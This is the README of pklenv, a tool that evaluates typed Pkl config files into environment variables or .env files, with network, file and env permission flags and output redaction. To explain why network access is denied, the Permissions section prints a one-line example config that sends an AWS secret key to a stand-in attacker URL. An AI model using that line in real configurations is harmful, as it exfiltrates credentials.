# pklenv

Typed, cascading environment config backed by [Pkl](https://pkl-lang.org).

`.pkl` files are the source of truth: they cascade via `amends`, they are typed,
they can reference each other, and they can `read("env:VAR")` to pull in values
assigned at runtime by CI/CD without those values ever touching disk.

Two subcommands over one evaluator:

```bash
pklenv run -- npm start        # inject the resolved values into a child process
pklenv emit                    # write flat .env files for tools that need one
```

## Install

```bash
go install github.com/idleberg/pklenv/cmd/pklenv@latest
```

> [!IMPORTANT]
> The [`pkl` CLI](https://pkl-lang.org/main/current/pkl-cli) has to be on `PATH`
> at runtime — `pklenv` evaluates by spawning `pkl server` and speaking its
> protocol. Install it however you manage tools; the
> [installation guide](https://pkl-lang.org/main/current/pkl-cli/index.html#installation)
> covers Homebrew, Mise, a JVM jar and native binaries.

## Configuring

File naming mirrors the dotenv convention:

| dotenv            | pklenv               |
| ----------------- | -------------------- |
| `.env`            | `env.pkl`            |
| `.env.local`      | `env.local.pkl`      |
| `.env.production` | `env.production.pkl` |

```pkl
amends "env-schema.pkl"

redactions { "*_TOKEN"; "*_SECRET" }

vars {
  ["NODE_ENV"] = "production"
  ["PORT"] = 8080
  ["API_TOKEN"] = read("env:CI_DEPLOY_TOKEN")
  ["LEGACY_KEY"] = new Var { value = "public"; redact = false }
}
```

`env-schema.pkl` is the schema module, and `pklenv` writes it for you: it ships
inside the binary, and any command that evaluates a config referencing it drops
a copy alongside. Nothing is fetched over the network, so `pkl eval` and your
editor resolve it too.

**Commit it.** It is executed on every evaluation, so a change to it belongs in
review rather than appearing silently in a working tree. `pklenv` verifies the
copy against the one in the binary each run and regenerates it if they differ,
saying so as it does — a file it did not write is never overwritten.

Discovery and merging are separate mechanisms. Discovery is a plain glob —
`env.pkl` plus anything matching `env.*.pkl` — with no hierarchy inferred from
the filename. Merging happens only through a file's own explicit `amends`
declaration. `pklenv` never combines two files itself.

## Reading the environment

A config can pull values in during evaluation, which is how a CI-assigned secret
reaches a `.env` without ever being written down:

```pkl
vars {
  ["API_TOKEN"] = read("env:CI_DEPLOY_TOKEN")
}
```

Every variable is readable by default. Selection belongs in the config, where
Pkl already has a language for it — `read*` returns every match as a `Mapping`,
keyed with the `env:` prefix intact:

```pkl
vars {
  for (k, v in read*("env:APP_*")) {
    [k.drop(4)] = v
  }
}
```

`--allow-env` narrows that when you want it narrowed; see below.

## Permissions

A config is a program: it can read files, fetch URLs and read the environment
while it evaluates. `pklenv` denies the network outright, confines file access to
the working directory, and leaves the environment open unless you say otherwise.

| Flag                      | Default               | What it governs                                                                                                                                          |
| ------------------------- | --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-w`, `--working-dir DIR` | the current directory | Where `pklenv` behaves as though it had been started. Moves discovery, output, the child's directory under `run`, and the `--root-dir` default together. |
| `--root-dir DIR`          | the working directory | How far `file:` reads and imports may reach. `--root-dir=''` removes the boundary.                                                                       |
| `--allow-net[=HOST…]`     | nothing               | Which origins `https:` and `package:` may reach. Bare, it allows any host.                                                                               |
| `--allow-env[=NAME…]`     | everything            | Which variables `read("env:…")` may see. Bare, it allows none.                                                                                           |

The channel this closes is the one that matters for a tool holding secrets:

```pkl
["X"] = read("https://evil.example/?leak=" + read("env:AWS_SECRET_ACCESS_KEY"))
```

That now fails, and the error names the flag that would permit it. `pklenv` also
declines to print the URI it refused — the query string _is_ the payload, and a
tool that blocks the request and then writes the secret into a CI log has
achieved nothing. You get the origin, which is what `--allow-net` needs, and
Pkl's source excerpt, which shows the expression rather than its result.

`--allow-net` grants are per origin, and a path narrows further:

```bash
pklenv emit --allow-net=example.com
pklenv emit --allow-net=raw.githubusercontent.com/idleberg/pklenv/v0.1.0/
pklenv emit --allow-net=http://internal.example   # plaintext needs its scheme
```

Pkl normalises a URI before testing it and re-checks the target of a redirect,
so neither `..` traversal nor a 302 to another host escapes a grant. Naming a
host does not admit a longer one: allowing `example.com` refuses
`example.com.evil.net`.

`--allow-env` grants are exact, not prefixes — `--allow-env=API` does not admit
`API_TOKEN`. A refused read is distinguishable from an absent one: it raises,
and `read?()` cannot turn it into a silent `null`. Bulk `read*("env:APP_*")`
simply returns fewer entries, since a glob expects no particular name.

> [!CAUTION]
> These are limits on **evaluation**, not a sandbox around your project.
> `--allow-env` does not filter what `run` passes to the child — the child still
> inherits the full environment. Granting `--allow-net=host` grants exfiltration
> to that host. And a config you have chosen to trust is still trusted: what
> changes is that trusting it no longer means handing it the machine.

## Redaction

Output masking. Opt-in and explicit, following
[mise](https://mise.jdx.dev/environments/#redactions): nothing is masked unless
a glob matches or a `redact` flag says so. Values read from the environment are
**not** sensitive by default.

- `redactions { "*_TOKEN" }` — glob list, matched case-sensitively
- `new Var { value = "..."; redact = true }` — mask one the globs miss
- `new Var { value = "..."; redact = false }` — waive one they match too eagerly

Masking covers pklenv's own output _and_ the child's under `run`, which is why
the child's streams are piped. That costs the child its terminal; `--raw` hands
the streams over untouched and turns masking off, saying so as it does.

In GitHub Actions, `pklenv` also emits `::add-mask::` for every redacted value,
so the guarantee extends to logs it is not in the path of.

> [!CAUTION]
> Redaction is output masking, not access control. A masked value is still
> injected verbatim, and a child that writes it to a file or a network call is
> outside pklenv's reach.

Outside it too: a Pkl error raised _during_ evaluation — the failure is what
prevented pklenv from learning which values were secret. Those diagnostics are summarized unless you are at a terminal or
pass `--verbose`, so a CI log gets the classification without the excerpt.

## The unredacted-secret warning

Explicit-only redaction has one failure mode: forgetting. So `pklenv` warns when
a variable _name_ looks sensitive (`*SECRET*`, `*PASSWORD*`, `*TOKEN*`,
`*CREDENTIAL*`, `*PRIVATE_KEY*`, `*API_KEY*`, `*PASSWD*`) and no redaction rule
covers it.

```
WARN you might leak sensitive values: DB_PASSWORD
```

It prints names, never values — printing the value is the hazard being warned
about. It is advisory; `--strict` promotes it to a non-zero exit.

`PKLENV_STRICT=1` sets that default for every invocation, so a CI job declares
it once instead of repeating the flag; `--strict=false` still overrides it for a
single command. `1`, `true`, `yes` and `on` turn it on, `0`, `false`, `no` and
`off` turn it off, and anything else is treated as on with a warning naming the
value — a variable that exists to tighten a check must not loosen it on a typo.
It is a variable of its own rather than an inference from `CI`
on purpose — `--strict` is the one place a heuristic decides an exit code, and
the pattern list behind it will grow, so turning it on has to be somebody's
decision rather than a side effect of where the command ran.

The question it is really asking is whether anyone has decided about this
variable. There are three answers — the three states the code names `Redacted`,
`Waived` and `Undeclared` — and only the last one warns:

| is there a decision? | how it's spelled                   | masked | warns                            |
| -------------------- | ---------------------------------- | ------ | -------------------------------- |
| yes — it's a secret  | a glob matches, or `redact = true` | yes    | no                               |
| yes — it isn't       | `redact = false`                   | no     | no                               |
| no                   | nothing covers it                  | no     | yes, if the name looks sensitive |

`redact = false` is not the same as saying nothing. It records that somebody
looked, and that is the only difference the warning cares about — a waived
variable and an undeclared one are masked identically, which is to say not at
all. The same variable, two ways:

```pkl
["DB_PASSWORD"] = "hunter2000"                                     // warns
["DB_PASSWORD"] = new Var { value = "hunter2000"; redact = false } // silent
```

Both write `DB_PASSWORD=hunter2000` into the `.env`, and neither masks anything
in the output. `redact = false` answers the warning, not the masking.

Deliberately _not_ a bare `KEY` pattern: `SORT_KEY`, `PUBLIC_KEY` and
`KEYBOARD_SHORTCUTS` would all trip it, and a warning people learn to scroll
past takes the one that mattered down with it.

The heuristic never changes behaviour — not what resolves, not what is masked,
not what is written. It only ever prints.

## Development

```bash
mise install          # go, pkl, golangci-lint, hk
mise run test
mise run check        # everything the pre-commit hook runs
hk install            # formatting, linting and tests on commit
```

## License

Dual-licensed under either of

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE))
- MIT License ([LICENSE-MIT](LICENSE-MIT))

at your option. Unless you state otherwise, any contribution you intentionally
submit for inclusion in this work, as defined in the Apache-2.0 license, is
dual-licensed on these terms with no additional conditions.
